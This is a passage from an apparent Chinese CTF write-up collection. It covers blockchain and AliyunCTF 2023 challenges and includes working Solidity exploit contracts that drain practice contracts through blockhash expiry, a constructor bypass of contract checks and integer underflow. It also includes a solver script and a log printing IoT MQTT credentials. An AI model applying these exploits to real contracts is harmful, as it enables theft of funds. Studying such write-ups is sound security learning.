\u5e94\u8be5\u662f 1</p> <p>\u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a <pre><code>import rlp\nimport web3\n\ndef calc_address(deployer, nonce):\n    return web3.Web3.keccak(rlp.encode([deployer, nonce]))\n\nfor nonce in range(1, 1000000):\n    if calc_address(0xeD0D5160c642492b3B482e006F67679F5b6223A2, nonce).hex().endswith(\"66318f6b06fd5769fa310732566b13d92cfbc589\"):\n        print(nonce)\n        break\n</code></pre> \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a <pre><code>deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2\nnonce = 485\n\nchallenge = int(calc_address(deployer, nonce).hex()[-40:], 16)\nprint(f\"next challenge address: {hex(challenge)}\")\n\ndebug = int(calc_address(challenge, 1).hex()[-40:], 16)\nprint(f\"next DebugAuthorizer address: {hex(debug)}\")\n\"\"\"\nnext challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\nnext DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe\n\"\"\"\n</code></pre> \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86</p>"},{"location":"writeups/SecurityInnovation/#raffle","title":"Raffle","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Raffle is CtfFramework{\n\n    uint256 constant fee = 0.1 ether;\n\n    address private admin;\n\n    bytes4 private winningTicket;\n    uint256 private blocknum;\n\n    uint256 public ticketsBought;\n    bool public raffleStopped;\n\n    mapping(address=&gt;uint256) private rewards;\n    mapping(address=&gt;bool) private potentialWinner;\n    mapping(address=&gt;bytes4) private ticketNumbers;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        rewards[address(this)] = msg.value;\n        admin = msg.sender;\n    }\n\n    function buyTicket() external payable ctf{\n        if(msg.value &gt;= fee){\n            winningTicket = bytes4(0);\n            blocknum = block.number+1;\n            ticketsBought += 1;\n            raffleStopped = false;\n            rewards[msg.sender] += msg.value;\n            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);\n            potentialWinner[msg.sender] = true;\n        }\n    }\n\n    function closeRaffle() external ctf{\n        require(ticketsBought&gt;0);\n        require(!raffleStopped);\n        require(blocknum != 0);\n        require(winningTicket == bytes4(0));\n        require(block.number&gt;blocknum);\n        require(msg.sender==admin || rewards[msg.sender]&gt;0);\n        winningTicket = bytes4(blockhash(blocknum));\n        potentialWinner[msg.sender] = false;\n        raffleStopped = true;\n    }\n\n    function collectReward() external payable ctf{\n        require(raffleStopped);\n        require(potentialWinner[msg.sender]);\n        rewards[address(this)] += msg.value;\n        if(winningTicket == ticketNumbers[msg.sender]){\n            msg.sender.transfer(rewards[msg.sender]);\n            msg.sender.transfer(rewards[address(this)]); \n            rewards[msg.sender] = 0;\n            rewards[address(this)] = 0;\n        }\n    }\n\n    function skimALittleOffTheTop(uint256 _value) external ctf{\n        require(msg.sender==admin);\n        require(rewards[address(this)]&gt;_value);\n        rewards[address(this)] = rewards[address(this)] - _value;\n        msg.sender.transfer(_value);\n    }\n\n    function () public payable ctf{\n        if(msg.value&gt;=fee){\n            this.buyTicket();\n        }\n        else if(msg.value == 0){\n            this.closeRaffle();\n        }\n        else{\n            this.collectReward();\n        }\n    }\n\n}\n</code></pre> <p>\u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash</p> <p>\u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0</p> <p>\u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86</p> <p>\u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570</p> exp <pre><code>contract Exploit {\n    Raffle challenge;\n    constructor(address addr) public {\n        challenge = Raffle(addr);\n    }\n    function buyTicket() public payable {\n        challenge.buyTicket.value(msg.value)();\n    }\n    function exp() public {\n        address(challenge).call.value(0 ether)();\n        challenge.collectReward();\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"},{"location":"writeups/SecurityInnovation/#scratchcard","title":"Scratchcard","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\nlibrary Address {\n    function isContract(address account) internal view returns (bool) {\n        uint256 size;\n        assembly { size := extcodesize(account) }\n        return size &gt; 0;\n    }\n}\n\ncontract Scratchcard is CtfFramework{\n\n    event CardPurchased(address indexed player, uint256 cost, bool winner);\n\n    mapping(address=&gt;uint256) private winCount;\n    uint256 private cost;\n\n\n    using Address for address;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n    }\n\n    modifier notContract(){\n        require(!msg.sender.isContract(), \"Contracts Not Allowed\");\n        _;\n    }\n\n    function play() public payable notContract ctf{\n        bool won = false;\n        if((now%10**8)*10**10 == msg.value){\n            won = true;\n            winCount[msg.sender] += 1;\n            cost = msg.value;\n            msg.sender.transfer(cost);\n        }\n        else{\n            cost = 0;\n            winCount[msg.sender] = 0;\n        }\n        emit CardPurchased(msg.sender, msg.value, won);\n    }    \n\n    function checkIfMegaJackpotWinner() public view returns(bool){\n        return(winCount[msg.sender]&gt;=25);\n    }\n\n    function collectMegaJackpot(uint256 _amount) public notContract ctf{\n        require(checkIfMegaJackpotWinner(), \"User Not Winner\");\n        require(2 * cost - _amount &gt; 0, \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\");\n        winCount[msg.sender] = 0;\n        msg.sender.transfer(_amount);\n    }\n\n    function () public payable ctf{\n        play();\n    }\n\n}\n</code></pre> <p>\u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 <code>2*cost - _amount &gt; 0</code> \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86</p> <p>\u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6</p> exp <pre><code>contract Attacker {\n    Scratchcard challenge;\n    uint public count;\n    uint public money;\n    constructor(address addr, address player) public payable {\n        challenge = Scratchcard(addr);\n        count = 0;\n        while (count &lt; 25) {\n            money = (now%10**8)*10**10;\n            challenge.play.value(money)();\n            count += 1;\n        }\n        challenge.collectMegaJackpot(addr.balance);\n        selfdestruct(player);\n    }\n    function() public payable {}\n}\n\ncontract Exploit {\n    Scratchcard challenge;\n    address player;\n    uint8 public nonce;\n    constructor(address addr, address _player) public {\n        challenge = Scratchcard(addr);\n        player = _player;\n        nonce = 1;\n    }\n    function exp() public payable {\n        address attacker = address(keccak256(0xd6, 0x94, this, nonce));\n        nonce += 1;\n        challenge.ctf_challenge_add_authorized_sender(attacker);\n        address(attacker).transfer(4 ether);\n        Attacker newAttacker = new Attacker(address(challenge), player);\n    }\n    function() public payable {}\n    function destroy() public {\n        selfdestruct(player);\n    }\n}\n</code></pre>"},{"location":"writeups/aliyunctf2023/","title":"AliyunCTF 2023 Writeup","text":"<p> \u7ea6 1660 \u4e2a\u5b57  344 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>\u963f\u91cc\u4e91\u7b2c\u4e00\u6b21\u529e CTF\uff0c\u5956\u91d1\u6bd4\u8f83\u591a\uff0c\u9898\u76ee\u4e0d\u7b80\u5355\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u6709\u70b9\u70e6</p>"},{"location":"writeups/aliyunctf2023/#oobdetection","title":"OOBdetection","text":"<p>\u7ed9\u51fa\u4e86\u4e00\u4e2a\u65b0\u5b9a\u4e49\u7684\u7b80\u5355\u8bed\u8a00\u7684 EBNF \u63cf\u8ff0\uff0c\u8981\u6c42\u5728\u4e24\u5206\u949f\u5185\u5224\u65ad\u4e09\u767e\u4e2a\u7a0b\u5e8f\u662f\u5426\u4f1a\u4ea7\u751f\u6570\u7ec4\u8d8a\u754c\uff08oob\uff09\u6216\u8005\u5176\u4ed6\u9519\u8bef\uff08unknown\uff09\u3002</p> <p>\u7ed9\u4e86 EBNF \u6240\u4ee5\u5c31\u76f4\u63a5\u987a\u7740\u8d70\u7f16\u8bd1\u539f\u7406 interpreter \u90a3\u8def\uff0c\u6ca1\u5b66\u8fc7\u7f16\u8bd1\u539f\u7406\uff0c\u641c\u4e86\u641c\u770b python \u6709 lark-parser \u53ef\u4ee5\u89e3\u6790\uff0c\u4f46\u662f\u9898\u7ed9\u7684 EBNF \u5199\u6cd5\u4e0d\u80fd\u7528\uff0c\u6539\u4e86\u6539\uff08\u8fd9\u4e2a lark \u611f\u89c9\u8981\u6c42\u7684\u5199\u6cd5\u8fd8\u633a\u4e25\u683c\u7684\uff09\uff1a</p> SC \u8bed\u8a00 EBNF \u63cf\u8ff0 <pre><code>prog : deflist arrlist\n\ndeflist : (vardef \";\")*\n\narrlist : (arrayexpr \";\")*\n\nTYPENAME : \"int\"      \n\nvardef : TYPENAME ID (\"[\" expr \"]\")*\n       | TYPENAME ID \"=\" DIGITSEQUENCE \n\narrayunit : ID \"[\" expr \"]\" (\"[\" expr \"]\")*\n\narrayexpr : ID ASSIGNMENTOPERATOR arrayunit\n          | ID ASSIGNMENTOPERATOR expr\n          | arrayunit ASSIGNMENTOPERATOR expr\n\nexpr : arrayunit OP expr\n     | ID OP expr    \n     | DIGITSEQUENCE OP expr \n     | arrayunit                         \n     | ID                        \n     | DIGITSEQUENCE\n\nOP : \"/\" | \"*\" | \"+\" | \"-\"\n\nID : IDNONDIGIT (IDNONDIGIT | DIGIT)*\n\nDIGITSEQUENCE : NZDIGIT DIGIT*\n\nNZDIGIT : \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\"\n\nDIGIT : \"0\" |  \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\"\n\nIDNONDIGIT : \"a\"..\"z\" | \"A\"..\"Z\" | \"_\"\n\nASSIGNMENTOPERATOR : \"=\"\n\n%ignore \" \"\n%ignore \"\\n\"\n</code></pre> <p>\u7136\u540e\u4e22\u7ed9 lark\uff0c\u521b\u5efa\u4e00\u4e2a parser \u5c31\u53ef\u4ee5\u5bf9\u8f93\u5165\u7684\u7a0b\u5e8f\u5206\u6790\u51fa ast \u4e86\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386 ast \u5373\u53ef\u3002</p> <p>\u53ef\u4ee5\u521b\u5efa\u4e24\u4e2a\u5b57\u5178\uff0c\u4e00\u4e2a\u5b58\u53d8\u91cf\u3001\u4e00\u4e2a\u5b58\u5b57\u5178\u3002\u4e3a\u4e86\u5224\u65ad\u8d8a\u754c\u9519\u8bef\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u8ddf\u7740\u7a0b\u5e8f\u4e00\u8d77\u5728 python \u5185\u521b\u5efa\u51fa\u4e00\u4e2a\u540c\u6837\u5927\u5c0f\u7684\u6570\u7ec4\uff0c\u5728\u8bbf\u95ee\u7684\u65f6\u5019\u5982\u679c\u8d8a\u754c\u4f1a\u629b\u51fa IndexError \u5f02\u5e38\uff0ctry-except \u6355\u83b7\u5373\u53ef\u3002\u540c\u65f6\u8fd8\u8981\u6ce8\u610f python \u662f\u652f\u6301\u8d1f\u6570\u7d22\u5f15\u8bbf\u95ee\u7684\uff0c\u6240\u4ee5\u5728\u8bbf\u95ee\u4e4b\u524d\u8fd8\u8981\u7279\u522b\u5224\u65ad\u4e00\u4e0b\u8d1f\u6570\u7d22\u5f15\u7684\u60c5\u51b5\uff0c\u6b64\u65f6\u4e5f\u5e94\u8be5 oob\u3002</p> <p>\u5bf9\u4e8e\u5176\u4ed6\u9519\u8bef\uff0c\u5982\u679c\u53d8\u91cf\u6216\u8005\u6570\u7ec4\u6ca1\u5b9a\u4e49\u5c31\u8fdb\u884c\u4e86\u4f7f\u7528\uff0c\u8fd9\u65f6\u4f1a\u629b\u51fa KeyError\uff0c\u4e5f\u662f\u6355\u83b7\u4e00\u4e0b\u5c31\u53ef\u4ee5\uff0c\u9664\u6b64\u4e4b\u5916\u7684\u9519\u8bef\u5c31\u662f\u9664\u4ee5\u96f6\u7684\u9519\u8bef\uff0c\u5224\u65ad\u4e00\u4e0b\u6216\u8005\u6355\u83b7 ZeroDivisionError \u90fd\u53ef\u4ee5\u3002</p> exp <pre><code>from pwn import *\nfrom hashlib import sha256\nfrom lark import Lark, Token\n\np = remote(...)\n\nparser = Lark(r\"\"\"\n    ...\n\"\"\", start = \"prog\")\n\nvar = {}\narr = {}\n\ndef array_unit(tree):\n    Id = tree.children[0].value\n    res = arr[Id]\n    for child in tree.children[1:]:\n        sub = expr_sc(child)\n        if sub &lt; 0:\n            raise IndexError\n        res = res[sub]\n    if res == \"unknown\":\n        raise KeyError\n    return res\n\ndef array_unit_write(tree, val):\n    Id = tree.children[0].value\n    res = arr[Id]\n    for child in tree.children[1:-1]:\n        sub = expr_sc(child)\n        if sub &lt; 0:\n            raise IndexError\n        res = res[sub]\n    sub = expr_sc(tree.children[-1])\n    if sub &lt; 0:\n        raise IndexError\n    res[sub] = val\n\ndef expr_sc(tree):\n    if isinstance(tree, Token):\n        if tree.type == \"DIGITSEQUENCE\":\n            return int(tree.value)\n        elif tree.type == \"ID\":\n            if var[tree.value] == \"unknown\":\n                raise KeyError\n            else:\n                return var[tree.value]\n        else:\n            return array_unit(tree)\n    if len(tree.children) == 3:\n        if tree.children[1].value == \"+\":\n            return expr_sc(tree.children[0]) + expr_sc(tree.children[2])\n        elif tree.children[1].value == \"-\":\n            return expr_sc(tree.children[0]) - expr_sc(tree.children[2])\n        elif tree.children[1].value == \"*\":\n            return expr_sc(tree.children[0]) * expr_sc(tree.children[2])\n        elif tree.children[1].value == \"/\":\n            return expr_sc(tree.children[0]) // expr_sc(tree.children[2])\n    elif tree.data == \"arrayunit\":\n        return array_unit(tree)\n    else:\n        return expr_sc(tree.children[0])\n\ndef def_sc(tree):\n    if len(tree.children) == 2:\n        var[tree.children[1].value] = \"unknown\"\n    elif isinstance(tree.children[2], Token):\n        var[tree.children[1].value] = int(tree.children[2].value)\n    else:\n        a = \"unknown\"\n        for child in tree.children[2:][::-1]:\n            if a == \"unknown\":\n                a = [a for i in range(expr_sc(child))]\n            else:\n                a = [a[:] for i in range(expr_sc(child))]\n        arr[tree.children[1].value] = a\n\ndef array_sc(tree):\n    child1 = tree.children[0]\n    child2 = tree.children[1]\n    child3 = tree.children[2]\n    if isinstance(child1, Token):\n        if child3.data == \"expr\":\n            var[child1.value] = expr_sc(child3)\n        else:\n            var[child1.value] = array_unit(child3)\n    else:\n        array_unit_write(child1, expr_sc(child3))\n\ndef run_sc(tree):\n    if tree.data == \"prog\":\n        for child in tree.children:\n            run_sc(child)\n    elif tree.data == \"deflist\":\n        for child in tree.children:\n            def_sc(child)\n    elif tree.data == \"arrlist\":\n        for child in tree.children:\n            array_sc(child)\n\np.recvuntil(b\"!\\n\")\n\nfor rnd in range(300):\n    print(f\"[*] round #{rnd}\")\n    p.recvuntil(b\"!\")\n    code = p.recvuntil(b\"Your\", drop=True).decode().strip()\n    var = {}\n    arr = {}\n    tree = parser.parse(code)\n    try:\n        run_sc(tree)\n    except IndexError:\n        print(f\"[+] oob detected\")\n        p.sendlineafter(b\"):\", b\"oob\")\n    except (KeyError, ZeroDivisionError):\n        print(f\"[+] unknown detected\")\n        p.sendlineafter(b\"):\", b\"unknown\")\n    else:\n        print(f\"[+] safe\")\n        p.sendlineafter(b\"):\", b\"safe\")\n\np.interactive()\n</code></pre> <p>flag: aliyunctf{0k_y0u_kn0w_h0w_to_analyse_Pr0gram}\u3002</p>"},{"location":"writeups/aliyunctf2023/#_1","title":"\u6d88\u5931\u7684\u7535\u6ce2","text":"<p>\u4e00\u4e2a\u975e\u5e38\u5750\u7262\u7684\u8c1c\u8bed\u9898\u3002\u7ed9\u4e86\u4e00\u4e2a\u97f3\u9891\uff0c\u5305\u542b\u4e09\u957f\u4e09\u77ed\u4e00\u5171\u516d\u6bb5\uff0c\u6bcf\u4e00\u79cd\u957f\u5ea6\u7684\u6ce2\u5f62\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002Au \u91cc\u9762\u7f29\u653e\u53ef\u4ee5\u770b\u5230\uff1a</p> <p></p> <p>\u4e0d\u96be\u60f3\u5230\u4e00\u9ad8\u4e00\u4f4e\u662f 1 \u548c 0\uff0c\u53ef\u4ee5\u7528 python scipy.io.wavefile \u6765\u8bfb\u53d6\u6ce2\u5f62\u6570\u636e\uff0c\u7136\u540e\u7528 scipy.signal.argrelextrema \u6765\u627e\u5230\u6240\u6709\u6781\u503c\uff0c\u548c\u4e00\u4e2a\u9608\u503c\u6bd4\u8f83\uff0c\u9ad8\u4e86\u5c31\u662f 1 \u4f4e\u4e86\u5c31\u662f 0\u3002\u5904\u7406\u7ed3\u679c\u53ef\u4ee5\u53d1\u73b0\u6240\u6709 1 \u90fd\u662f\u4e09\u4e2a\u4e00\u8d77\u51fa\u73b0\uff0c0 \u90fd\u662f\u56db\u4e2a\u4e00\u8d77\u51fa\u73b0\uff0c\u6240\u4ee5\u4e09\u4e2a 1 \u66ff\u6362\u4e3a\u4e00\u4e2a 1\u3001\u56db\u4e2a 0 \u66ff\u6362\u4e3a\u4e00\u4e2a 0\uff0c\u6700\u540e\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a</p> <pre><code>import numpy as np\nfrom scipy.io import wavfile\nfrom scipy.signal import argrelextrema\n\nsample_rate, data = wavfile.read(\"OVUB7rdc9oH112Ve.wav\")\n\nsections = []\n\nsections.append(np.trim_zeros(data[50000:150000]))\nsections.append(np.trim_zeros(data[150000:230000]))\nsections.append(np.trim_zeros(data[230000:300000]))\nsections.append(np.trim_zeros(data[300000:370000]))\nsections.append(np.trim_zeros(data[370000:420000]))\nsections.append(np.trim_zeros(data[420000:]))\n\nfor i, section in enumerate(sections):\n    print(\"\".join([str(int(i)) for i in (section[argrelextrema(section, np.greater)[0]] &gt; 8000)]).replace(\"111\", \"1\").replace(\"0000\", \"0\"))\n\n\"\"\"\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n\"\"\"\n</code></pre> <p>\u8f6c\u4e3a ASCII \u53ef\u4ee5\u53d1\u73b0\u524d\u9762\u7684\u90fd\u662f *\uff0c\u5e94\u8be5\u662f\u6ca1\u6709\u7528\u7684\uff0c\u7b2c\u4e8c\u79cd\u77ed\u7684\u90fd\u662f 0x8d\uff0c\u7b2c\u4e00\u79cd 01 \u4e32\u5e94\u8be5\u662f\u4e3b\u8981\u4fe1\u606f\u3002</p> <p>\u7136\u540e\u8fd9\u91cc\u5361\u4e86\u4e00\u6574\u5929\uff0c\u5728 CyberChef \u91cc\u4e71\u8bd5\uff0c\u6700\u540e yyy \u7761\u89c9\u68a6\u5230\u4e86\u89e3\u6cd5\uff08x \u5728 CyberChef \u91cc\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>\u7b2c\u4e8c\u79cd 01 \u4e32\u5b8c\u5168\u6ca1\u6709\u7528\u5230\u3002\u5f88\u5947\u602a\u3002</p> <p>\u8fd9\u4e2a\u7ed3\u679c\u89e3\u91ca\u8d77\u6765\u5c31\u662f\u4e00\u4e2a\u963f\u91cc\u4e91\u7684 OSS \u5bf9\u8c61\u5b58\u50a8\uff0c\u4f4d\u7f6e\u5728\u676d\u5dde\uff0cbucket \u540d\u662f ALBB-iot2023\uff0c\u5bf9\u8c61\u662f OpYdCuMtkQ8Yjhm2\u3002\u4e8e\u662f\u8bbf\u95ee https://ALBB-iot2023.oss-cn-hangzhou.aliyuncs.com/OpYdCuMtkQ8Yjhm2\uff0c\u8df3\u8f6c\u5230\u4e86 D3CTF \u5e73\u53f0\u8349\uff0cwget \u4e00\u4e0b\uff0c\u91cc\u9762\u6709\u4e00\u4e2a base64\uff0c\u89e3\u7801\u4e00\u4e0b\u662f aliyunctf{you_are_a_jocker}\uff0c\u5047 flag\uff0cjoker \u8fd8\u5199\u9519\u4e86\uff08x</p> <p>\u6700\u540e\u8bd5\u51fa\u6765\u5176\u5b9e bucket \u662f iot2023\uff0cALBB \u53ea\u662f\u63d0\u793a\u662f\u963f\u91cc\u4e91\u7684\u5e94\u8be5\uff0c\u800c\u4e14\u963f\u91cc\u4e91 OSS bucket \u540d\u79f0\u5176\u5b9e\u4e0d\u5141\u8bb8\u662f\u5927\u5199\u3002\u8bbf\u95ee https://iot2023.oss-cn-hangzhou.aliyuncs.com/OpYdCuMtkQ8Yjhm2\uff0c\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0cfile \u4e00\u4e0b\u662f Mach-O \u6b63\u597d mac \u53ef\u4ee5\u8dd1\uff0c\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\uff1a</p> <pre><code>[1682249479.453][LK-0313] MQTT user calls aiot_mqtt_connect api, connect\n[1682249479.453][LK-032A] mqtt host: a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com\n[1682249479.453][LK-0317] user name: ncApIY2XV9NUIY4VpbGk&amp;a1eAwsBKddO\n[1682249479.453][LK-0318] password: 70C3EC7A5774AF26EADEA867686238A403EF7A17118ABCABF1B49A8153D897DA\nestablish tcp connection with server(host='a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com', port=[443])\nsuccess to establish tcp, fd=5\nlocal port: 61892\n[1682249479.487][LK-1000] establish mbedtls connection with server(host='a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com', port=[443])\n[1682249479.574][LK-1000] success to establish mbedtls connection, (cost 45329 bytes in total, max used 48297 bytes)\n[1682249479.601][LK-0313] MQTT connect success in 148 ms\nAIOT_MQTTEVT_CONNECT\n[1682249479.601][LK-0309] sub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n[1682249479.601][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/update\n\n[LK-030A] &gt; 7B 22 69 64 22 3A 22 31  22 7D                   | {\"id\":\"1\"}      \n\nsuback, res: -0x0000, packet id: 1, max qos: 1\nheartbeat response\n[1682249479.668][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n\n[LK-030A] &lt; 54 72 79 20 65 6E 74 65  72 69 6E 67 20 77 68 61 | Try entering wha\n[LK-030A] &lt; 74 20 79 6F 75 20 77 61  6E 74 EF BC 81 EF BC 81 | t you want......\n[LK-030A] &lt; EF BC 81                                         | ...             \n\npub, qos: 0, topic: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\npub, payload: Try entering what you want\uff01\uff01\uff01\n[1682249480.917][LK-0309] pub: /ext/notify\n\n[LK-030A] &lt; 7B 22 74 69 74 6C 65 22  3A 22 6B 69 63 6B 22 2C | {\"title\":\"kick\",\n[LK-030A] &lt; 22 63 6F 6E 74 65 6E 74  22 3A 22 4B 69 63 6B 65 | \"content\":\"Kicke\n[LK-030A] &lt; 64 20 62 79 20 74 68 65  20 73 61 6D 65 20 64 65 | d by the same de\n[LK-030A] &lt; 76 69 63 65 22 7D                                | vice\"}          \n\npub, qos: 0, topic: /ext/notify\npub, payload: {\"title\":\"kick\",\"content\":\"Kicked by the same device\"}\n[1682249480.917][LK-1000] mbedtls_ssl_recv error, res: -0x7880\n[1682249480.917][LK-1000] adapter_network_deinit\n</code></pre> <p>\u770b\u8d77\u6765\u5c31\u662f\u548c\u4e00\u4e2a\u963f\u91cc\u4e91\u7684 MQTT 